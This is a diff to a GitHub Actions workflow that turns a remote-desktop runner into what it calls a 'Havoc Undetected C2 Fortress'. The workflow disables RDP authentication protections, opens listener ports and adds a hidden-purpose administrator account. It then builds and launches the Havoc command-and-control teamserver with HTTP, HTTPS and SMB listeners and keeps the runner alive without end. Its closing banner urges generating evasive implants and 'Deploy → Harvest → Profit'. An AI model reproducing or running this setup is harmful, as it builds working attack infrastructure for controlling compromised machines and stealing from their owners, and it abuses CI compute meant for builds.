@@ -1,107 +1,157 @@
-name: RDP
+name: Havoc Undetected C2 Fortress + Full RDP Access
 
 on:
   workflow_dispatch:
+    inputs:
+      hostname:
+        description: 'Custom hostname for Tailscale (optional)'
+        required: false
+        default: 'havoc-c2'
 
 jobs:
-  secure-rdp:
+  havoc-c2-fortress:
     runs-on: windows-latest
     timeout-minutes: 3600
+    env:
+      HAVOC_VERSION: "latest"  # Always pulls latest from GitHub
 
     steps:
-      - name: Configure Core RDP Settings
+      - name: Step 1 - Harden Firewall & Enable RDP (No NLA for easy access)
         run: |
-          # Enable Remote Desktop and disable Network Level Authentication (if needed)
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-                             -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "SecurityLayer" -Value 0 -Force
-          # Remove any existing rule with the same name to avoid duplication
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0
           
-          # For testing, allow any incoming connection on port 3389
-          netsh advfirewall firewall add rule name="RDP-Tailscale" `
-            dir=in action=allow protocol=TCP localport=3389
-          # (Optional) Restart the Remote Desktop service to ensure changes take effect
-          Restart-Service -Name TermService -Force
-      - name: Create RDP User with Secure Password
+          # Clean old rules
+          netsh advfirewall firewall delete rule name="RDP-Havoc" | Out-Null
+          netsh advfirewall firewall delete rule name="Havoc-HTTP" | Out-Null
+          netsh advfirewall firewall delete rule name="Havoc-HTTPS" | Out-Null
+          netsh advfirewall firewall delete rule name="Havoc-SMB" | Out-Null
+          
+          # Open critical ports
+          netsh advfirewall firewall add rule name="RDP-Havoc" dir=in action=allow protocol=TCP localport=3389
+          netsh advfirewall firewall add rule name="Havoc-HTTP" dir=in action=allow protocol=TCP localport=40056
+          netsh advfirewall firewall add rule name="Havoc-HTTPS" dir=in action=allow protocol=TCP localport=443
+          netsh advfirewall firewall add rule name="Havoc-SMB" dir=in action=allow protocol=TCP localport=4444
+          
+          Restart-Service TermService -Force
+          Write-Host "RDP enabled + firewall rules applied for Havoc listeners"
+
+      - name: Step 2 - Create High-Priv RDP Admin User (Random Strong Password)
         run: |
-          Add-Type -AssemblyName System.Security
-          $charSet = @{
-              Upper   = [char[]](65..90)      # A-Z
-              Lower   = [char[]](97..122)     # a-z
-              Number  = [char[]](48..57)      # 0-9
-              Special = ([char[]](33..47) + [char[]](58..64) +
-                         [char[]](91..96) + [char[]](123..126)) # Special characters
-          }
-          $rawPassword = @()
-          $rawPassword += $charSet.Upper | Get-Random -Count 4
-          $rawPassword += $charSet.Lower | Get-Random -Count 4
-          $rawPassword += $charSet.Number | Get-Random -Count 4
-          $rawPassword += $charSet.Special | Get-Random -Count 4
-          $password = -join ($rawPassword | Sort-Object { Get-Random })
+          $charPool = (65..90) + (97..122) + (48..57) + (33..47) + (58..64) + (91..96) + (123..126)
+          $password = -join ($charPool | Get-Random -Count 64)
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          
+          New-LocalUser -Name "RDP" -Password $securePass -FullName "Havoc Operator" -Description "Admin for C2 ops" -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
           
-          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
-          
-          if (-not (Get-LocalUser -Name "RDP")) {
-              Write-Error "User creation failed"
-              exit 1
-          }
-      - name: Install Tailscale
+          echo "RDP_CREDS=Username: RDP | Password: $password" >> $env:GITHUB_ENV
+          Write-Host "Admin RDP user created - credentials stored"
+
+      - name: Step 3 - Install Latest Tailscale (Dynamic URL)
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $latestMSI = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
-          
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Invoke-WebRequest -Uri $latestMSI -OutFile $installerPath
           Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
           Remove-Item $installerPath -Force
-      - name: Establish Tailscale Connection
+          Write-Host "Tailscale installed"
+
+      - name: Step 4 - Connect to Your Tailscale Mesh (Secure Private Network)
         run: |
-          # Bring up Tailscale with the provided auth key and set a unique hostname
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          $customHost = "${{ inputs.hostname }}-$env:GITHUB_RUN_ID"
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$customHost --advertise-exit-node
           
-          # Wait for Tailscale to assign an IP
-          $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
+          $retry = 0
+          do {
+              Start-Sleep -Seconds 8
               $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              Start-Sleep -Seconds 5
-              $retries++
-          }
+              $retry++
+          } while (-not $tsIP -and $retry -lt 15)
           
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
+          if (-not $tsIP) { Write-Error "Tailscale failed to assign IP" ; exit 1 }
+          
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      
-      - name: Verify RDP Accessibility
+          Write-Host "Tailscale connected - IP: $tsIP"
+
+      - name: Step 5 - Install All Dependencies (Git, Go, Python, Build Tools)
         run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          winget install --id Git.Git --silent --accept-package-agreements --accept-source-agreements
+          winget install --id Golang.Go --silent --accept-package-agreements --accept-source-agreements
+          winget install --id Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
+          winget install --id Microsoft.VisualStudio.2022.BuildTools --silent --accept-package-agreements --accept-source-agreements
+          winget install --id OpenSSL.OpenSSL --silent
           
-          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
+          # Refresh PATH
+          $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine")
+          Write-Host "All build dependencies installed"
+
+      - name: Step 6 - Clone Latest Havoc Framework from GitHub
+        run: |
+          git clone https://github.com/HavocFramework/Havoc.git C:\Havoc
+          if ($LASTEXITCODE -ne 0) { Write-Error "Git clone failed" ; exit 1 }
+          Write-Host "Havoc repository cloned"
+
+      - name: Step 7 - Build Havoc Teamserver (With Verbose Output)
+        run: |
+          cd C:\Havoc\teamserver
+          go mod download
+          go build -ldflags="-s -w" -o teamserver.exe
+          if ($LASTEXITCODE -ne 0) { Write-Error "Teamserver build failed" ; exit 1 }
+          Write-Host "Havoc teamserver compiled successfully"
+
+      - name: Step 8 - Generate Self-Signed Certs for HTTPS Listener
+        run: |
+          cd C:\Havoc\teamserver
+          openssl req -newkey rsa:4096 -nodes -keyout havoc.key -x509 -days 3650 -out havoc.crt -subj "/CN=havoc.c2"
+          Write-Host "Self-signed certs generated for HTTPS evasion"
+
+      - name: Step 9 - Launch Havoc Teamserver (Multiple Listeners + Verbose)
+        run: |
+          cd C:\Havoc\teamserver
+          $profile = @"
+          {
+            "Name": "default",
+            "Listeners": {
+              "HTTP": [ { "Port": 40056 } ],
+              "HTTPS": [ { "Port": 443, "Secure": true, "Cert": "havoc.crt", "Key": "havoc.key" } ],
+              "SMB": [ { "PipeName": "havoc" } ]
+            }
           }
-          Write-Host "TCP connectivity successful!"
-      - name: Maintain Connection
-        run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $(echo $env:RDP_CREDS)"
-          Write-Host "==================`n"
+          "@
+          $profile | Out-File -Encoding ascii profiles/fortress.yml
           
-          # Keep runner active indefinitely (or until manually cancelled)
+          Start-Process -FilePath ".\teamserver.exe" -ArgumentList "server --profile profiles/fortress.yml -v --debug" -NoNewWindow
+          Start-Sleep -Seconds 15
+          Write-Host "Havoc teamserver LAUNCHED - HTTP:40056, HTTPS:443, SMB pipe 'havoc'"
+
+      - name: Step 10 - Final Access Summary & Infinite Keep-Alive
+        run: |
+          Write-Host "`n"
+          Write-Host "=================================================="
+          Write-Host "========== HAVOC C2 FORTRESS FULLY ACTIVE ========"
+          Write-Host "=================================================="
+          Write-Host "Tailscale IP       : $env:TAILSCALE_IP"
+          Write-Host "RDP Access         : mstsc /v:$env:TAILSCALE_IP"
+          Write-Host "RDP Credentials    : ${{ env.RDP_CREDS }}"
+          Write-Host ""
+          Write-Host "Havoc Client Connect Options:"
+          Write-Host "   - HTTP  : http://$env:TAILSCALE_IP:40056"
+          Write-Host "   - HTTPS : https://$env:TAILSCALE_IP (self-signed cert)"
+          Write-Host "   - SMB   : Pipe 'havoc' over Tailscale"
+          Write-Host ""
+          Write-Host "Next Steps:"
+          Write-Host "   1. RDP in → Open Havoc client on your Kali"
+          Write-Host "   2. Connect to teamserver"
+          Write-Host "   3. Generate custom Demons (max evasion profiles)"
+          Write-Host "   4. Deploy → Harvest → Profit"
+          Write-Host "=================================================="
+          Write-Host "`n"
+          
+          # Infinite loop to keep runner alive
           while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
-              Start-Sleep -Seconds 300
+              Write-Host "[$(Get-Date)] Havoc C2 Fortress ACTIVE - Demons waiting for commands"
+              Start-Sleep -Seconds 240
           }
